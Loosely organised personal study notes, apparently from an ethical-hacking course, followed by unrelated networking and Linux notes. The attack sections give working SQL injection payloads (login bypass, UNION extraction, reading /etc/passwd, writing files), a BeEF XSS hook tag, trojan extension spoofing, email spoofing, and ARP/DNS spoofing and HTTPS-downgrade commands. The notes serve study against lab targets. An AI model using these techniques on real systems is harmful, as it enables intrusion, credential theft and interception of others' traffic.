being able to gain access to a system that you are not supposed to have access to   black/white/grey

connecting wireless adapter to kali ->  monitor mode & packet injection required hence built in adapter is not good anyways
settings-ports-usb-enable-+ (listing shows chipset not brandname

ifconfig wlan0 down - ifconfig wlan0 hw ether 00:11:22:33:44:55 - ifconfig wlan0 up - just changing in memory  sometimes networkmanager
might reset 

iwconfig to list only wireless      - currently mode is managed(capture packets destined for itself)  
ifconfig wlan0 down - airmon-ng check kill (will loose internet connection as well) - iwconfig wlan0 mode monitor - ifconfig wlan0 up
(or airmon-ng start wlan0 - to enable monitor mode)


chipset is the brains of adapter that does all the processing & calculations not the brand - atheros AR9271  then alfa & realtek  recommended

sniffing -> airodump-ng <mon_dev>

wifi bands are 2.4 & 5G    (5 GHz monitoring not widely supported)

airodump-ng --band a <mon_dev>  # for 5G

using metaexploitable as target and keeps security low

info gathering -> ip dns technologies used(server,db,language) subdomains other webisites on same domain 

whois.domaintools.com      to get ip and dns and hosting details
toolbar.netcraft.com    to get technologies used
robtex.com       comprehensive dns records

exploit-db  containslist of latest exploits

gaining access to one website is an entry if  multiple websites run on same server

in bing type ip:<ip>  get multiple webs sharing ip

there might be subdomains that are not advertised like for employees

dirb - the tool to get hidden files in the directory when dir eq route (basically bruteforces with list of file names possibly
present in the directory)

xss - injecting js into page  
3 types  1)stored/persistent in db  executes everytime you visit
2)reflected   only while reaching a manipulated url
3)DOM       interpreted and run on client   WS not involved

reflected - he is trying to inject into text box or corresponding url GET    and types  <script>alert("XSS")</script>  then submit
then such an url is sent to the target 

stored/persistent - leverages the comment section and same code but runs on all clients loading the comments section

beef framework to use stored hook XSS      starting beef  and then commenting   <script  src="ip:3000/hook.js"> </script>
target shown as hooked in beef console   along with the multiple options that beef provions to be executed on the hooked

select * from accounts where user='user_name' and password='12345' and 1=1 #'

so basically need to inject whatever is the code needed in 1=1 section   then instead of and using or     only or needs to be true

the key is to break the things with ' or stuff and try and see the error or and & 1=1 1=2 true false statements

or inject in user field itself just - select * from 'admin' #    bypassing the login simply

GET is supposed to be idempotent and not supposed to make any persistent changes unlike POST

whenever you see something like .php & parameters injection possibilities are there in the url 
also can put order by     but while in url # should be replaced by %23   white space is %20  google to get more

getting the shape of table with order by trials and then select * from 'admin' union select 1,2,3,4 # 

but then using 1,user(),database(),version() #

union select 1,table_name,null,null,5 from information_schema.tables     - applies to my sql 
union select 1,column_name,null,null,5 from information_schema.columns wher table_name='accounts'
union select 1,username,password,is_admin,5 from accounts

file inclusion
union select null,load_file('/etc/passwd'),null,null,null 
union select null,'example example',null,null,null into outfile '/var/www/sitename/example.txt'

sqlmap is the tool for automated injection   sqlmap -u <url>

techniques used for prevention - filters,blacklist, whitelist but they can be bypassed but the best way is parametrization

maltego is the tool for info gathering about anything 

#############################################################################################

autoit is the tool he is using to compile the script after changing the extension from txt to au3. script basically downloads 
image + exe both in an array of urls. Goes to icon archive and gets the required icons and imprints that icon on the converted 
exe using autoit. rw-designer is the website he recommends for image to icon conversion. 
Keeps the file in docuroot and using metaexploit waits for incoming connections. then goes to windows and try downloading the 
file. By the time .exe file is executed hook happens.but .exe extension is obvious unless extensions are hidden in windows settings.
hence need to spoof the extension . But he is copying right-to-left character so that gtrexe.jpg  is written as gtrgpj.exe
but browsers remove the right-to-left extension hence he is archiving it before sending. Then while sending email spamming 
senders address as well using data gathered in previous phase. You could use an online site to do the spoofing but since 
they are public they would be already blacklisted and would end up in spam folder. 
beef wil ask for username password at initial login and open up firefox when done. Requires the hook.js be executed. He puts 
hook.js inside index file in docuroot and accesses the apache2 from win machine and it gets displayed in beef online devices.
In beef commands tab is of interest since it allows commands to be executed on remote machine. he is using 'bettercap' to spoof
as well. bettercap helps you downgrade https to http. In commands search for alerts and create alert dialog. Spyder eye gives 
screenshot. Another command is 'redirect' to have them to any other page. prettytheft is for fake logins. fake notification 
to tell corresponding browser to download extension and get reverse shell or backdoor. Again metaexploit is used for the reverse
shell. way to prevent the trojan is to right click properties and see the file type and make sure its jpg and not application exe
In windows ther is a tool called resource manager using that is similar to netstat to get ports and all in networking section.
Hybrid-analysis is one of the sandbox providers where you could test the trojans and analyze what they would do. 

mitm - basically sending a broadcast asking who has IP? and the target responds its MAC. arpspoof -i eth0 -t clientIP gwIP
plus a packet sniffer likecwireshark to analyze the data. But by default,routing is not enabled hence packets will be dropped.
Thus needs to enable port-forwarding.  echo 1 > /proc/sys/net/ipv4/ipforward. Then target will still get internet access. 
Bettercap is advanced than arpspoof. bettercap -iface eth0 then you are inside the tool prompt, typing net.probe on to start 
discovering other nodes in the subnet by sending udp packets. then use net.show to get a list of connected clients in a table.
set arp.spoof.fullduplex true . set arp.spoof.target targetip . then arp.spoof on - to turn on the module. Also ensure that net.probe
&net.recon are running as well. Making use of net.sniff module in bettercap itself to analyse the packets instead of tools 
like wireshark.Generating traffic by reaching http url from win machine. By now it captueres everything including logins. 

Subprocess is used here as well. subprocess.call will wait for the command to be finished before executing any other commands.
ifconfig interface down; ifconfig interface hw ether 00:11:22:33:44:55 ; ifconfig eth0 up 
input vs raw_input in 2. But subprocess module opens up vulnerability if input is not properly validated. For eg, In linux terminal 
; is used to separate commands just like SQL injection. Instead he suggests using the second method where each argument sepatrated 
by space is an element of a list ie ls -lrt is ['ls','-lrt']. Thats why they wont recommend shell=True. 
The whole --help and arguments and all can be taken care using optparse.

import optparse
parser = optparse.OptionParser()
parser.add_option("-i","--interface",dest="interface",help="Interface to change MAC") # similarly other arguments below
(options, arguments) = parser.parse_args()
print('The interface is '+options.interface)

Pastes the output in pythex an online site showing regex matches. Pasted the ifconfig output there as well. \w\w:\w\w:\w\w:\w\w:\w\w:\w\w  to match mac
ifcfg_res = subprocess.check_output('ifcfg') is cleaner.  mac_out = re.search(pattern,ifcfg_res)  then mac_out.group[0].

https = http + ssl/tls   -> basically encrypting the text . So MITM can read the data. tls/ssl is very difficult to break.
So technique is to downgrade to http. bettercap has a caplet to remove https. the advanced tool is ssl strip. pastes the downloaded
caplet to  /usr/share/bettercap/caplets/ (original.zip). within bettercap prompt, caplets.show() will list all the caplets.
just need to type hstshijack/hstshijack . then target tries to reach linkedin its going via http. but fb, twitter etc are using 
hsts which is harder to bypass. Incase of hsts, browser comes preloaded with a number of websites which can be loaded only in 
https. facebook.corn or twiter.com . change them in caplet file settings. Works only when user goes via search engine ie if he types 
in url it wont work since browser will only accept secure connection for listed websites. 
dns spoofing - redirecing from specific web to ours - again using bettercap since this is also mitm - set dns.spoof.all true
set dns.spoof.domains *.zsecurity.org   then  dns.spoof on . again this wont work against https. Or you can inject js in response 
from genuine site. creates a simple alert.js    put it in the bettercap hsts config file as before as*:/root/alert.js

tcpdump can show the whole sysn , syn+ack , ack , data , ack structure. From Gordon classes. And individual packet components
like full frame, IP , TCP ,data etc. ethtool can show device info like max transmission rate. 

        Supported link modes:   10baseT/Half 10baseT/Full     #10mbps
                                100baseT/Half 100baseT/Full    #100Mbps
                                1000baseT/Half 1000baseT/Full   #1gops
        Supported pause frame use: No
        Supports auto-negotiation: Yes    # it advertises & negotiates with other end and settles on the lower transmission rate of the two
        Advertised link modes:  10baseT/Half 10baseT/Full 
                                100baseT/Half 100baseT/Full 
                                1000baseT/Full 
        Advertised pause frame use: Symmetric Receive-only
        Advertised auto-negotiation: Yes
        Speed: 10Mb/s    ##### this shows the currently in use 
        Link detected: no     ### currently not connected or not able to detect connection ie the other end !!!
        
 
 
     inet 192.168.0.106/24 brd 192.168.0.255 scope global dynamic wlp1s0
       valid_lft 6763sec preferred_lft 6763sec
    inet6 fe80::ee3c:d655:269:ff6b/64 scope link tentative dadfailed     # scope link means local while global is internet 
       valid_lft forever preferred_lft forever
    inet6 fe80::890e:f539:da74:bcdc/64 scope link tentative dadfailed 
       valid_lft forever preferred_lft forever

Look for errors drop retransmissions. Too many errors indicate hardware failure. 
ethtool -S wlp1s0       # -S for statistics
NIC statistics:
     rx_packets: 513636
     rx_bytes: 612302518
     rx_duplicates: 272
     rx_fragments: 621047
     rx_dropped: 297
     tx_packets: 279918
     tx_bytes: 181796002
     tx_filtered: 0
     tx_retry_failed: 2
     tx_retries: 5487
     sta_state: 4
     txrate: 150000000
     rxrate: 108000000
     signal: 216
     channel: 0
     noise: 18446744073709551615
     ch_time: 18446744073709551615
     ch_time_busy: 18446744073709551615
     ch_time_ext_busy: 18446744073709551615
     ch_time_rx: 18446744073709551615
     ch_time_tx: 18446744073709551615

Or you can set new parameters with -s --> ethtool -s eth0 speed 100 duplex full

llly netstat -s shows network statistics as well. 

A friendly reminder: since Linux kernel 2.6.24 using /proc to store ACPI info has been discouraged and deprecated.

Now we are encouraged to use -> /sys/class/power_supply/BAT0.

UPDATE: Linux 3.19 and onwards, we should look at the following directory -> /sys/class/power_supply/BAT1/

For example checking capacity & status on Arch Linux running Linux 4.20 ->

# uname -a
Linux netbook 4.20.1-arch1-1-ARCH #1 SMP PREEMPT Wed Jan 9 20:25:43 UTC 2019 x86_64 GNU/Linux
# cat /sys/class/power_supply/BAT1/capacity
99
# cat /sys/class/power_supply/BAT1/status
Charging







 





















 









